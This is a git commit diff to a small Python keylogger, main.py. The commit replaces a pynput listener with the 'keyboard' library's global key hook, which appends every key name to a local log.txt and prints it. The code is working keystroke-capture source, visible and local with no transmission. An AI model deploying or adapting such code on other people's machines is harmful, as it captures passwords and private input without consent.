7d20edd3782f22d972539a54779113bd0d772705
thejokeson-you <milansaleh2004@gmail.com>
2024-07-14 09:50:30 +0100

    Replace original keylogging method with more effective one

--- main.py
+++ main.py
@@ -1,7 +1,7 @@
 # This should be a header for description of the program
 # REQUIRED: pip install keyboard with cmd prompt (standard, doesn't need admin permission)
 
-from pynput import keyboard
+import keyboard
 
 
 def keyLogged(key):
@@ -9,13 +9,18 @@ def keyLogged(key):
     print(str(key))
     with open("log.txt", 'a') as logFile:  # create log.txt file & append with every inputted char
         try:
-            inpt = key.char  # get input
-            logFile.write(inpt)  # append log file with input
+            inpt = key.name  # get input
+            logFile.write('{}\n'.format(inpt))  # append log file with input
         except:
             print("N/A")
 
 
 if __name__ == '__main__':
+    """
     listener = keyboard.Listener(on_press=keyLogged)  # call method above when a key is pressed
     listener.start()
-    input()
+    """
+    keyboard.on_press(keyLogged)
+    keyboard.wait()
+
+    # input()
